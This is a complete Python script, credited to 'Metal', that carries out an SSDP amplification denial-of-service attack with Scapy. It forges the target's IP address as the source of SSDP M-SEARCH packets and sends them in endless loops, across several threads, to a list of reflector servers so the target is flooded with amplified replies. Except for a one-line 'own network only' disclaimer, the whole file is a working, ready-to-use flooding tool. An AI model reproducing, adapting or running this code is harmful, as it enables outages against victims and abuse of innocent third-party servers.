#!/usr/bin/env python
from scapy.all import *
import sys
import threading
import time
#SSDP Amp DOS attack
#usage ssdp.py <target ip> <ssdpserver list> <number of threads> ex: ssdp.py 1.2.3.4 file.txt 10
#FOR USE ON YOUR OWN NETWORK ONLY


#packet sender
def deny():
	#Import globals to function
	global ssdplist
	global currentserver
	global data
	global target
	ssdpserver = ssdplist[currentserver] #Get new server
	currentserver = currentserver + 1 #Increment for next
	packet = IP(dst=ssdpserver,src=target)/UDP(sport=1900,dport=1900)/Raw(load=data) #BUILD IT
	send(packet,loop=1) #SEND IT

#So I dont have to have the same stuff twice
def printhelp():
	print "SSDP Amplification DOS Attack"
	print "By Metal"
	print "Usage ssdpdos.py <target ip> <ssdp server list> <number of threads>"
	print "ex: ssdpdos.py 1.2.3.4 file.txt 10"
	print "SSDP serverlist file should contain one IP per line"
	print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
	exit(0)
	
if len(sys.argv) < 4:
	printhelp()
#Fetch Args
target = sys.argv[1]

#Help out idiots
if target in ("help","-h","h","?","--h","--help","/?"):
	printhelp()

ssdpserverfile = sys.argv[2]
numberthreads = int(sys.argv[3])
#System for accepting bulk input
ssdplist = []
currentserver = 0
with open(ssdpserverfile) as f:
    ssdplist = f.readlines()

#Make sure we dont out of bounds
if numberthreads > int(len(ssdplist)):
	print "Attack Aborted: More threads than servers"
	print "Next time dont create more threads than servers"
	exit(0)

#Magic Packet aka SSDP M-Search request Packet
data = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"

#Hold our threads
threads = []
print "Starting to flood: "+ target + " using SSDP list: " + ssdpserverfile + " With " + str(numberthreads) + " threads"
print "Use CTRL+C to stop attack"

#Thread spawner
for n in range(numberthreads):
    thread = threading.Thread(target=deny)
    thread.daemon = True
    thread.start()

    threads.append(thread)

#In progress!
print "Sending SSDP requests..."

#Keep alive so ctrl+c still kills all them threads
while True:
	time.sleep(1)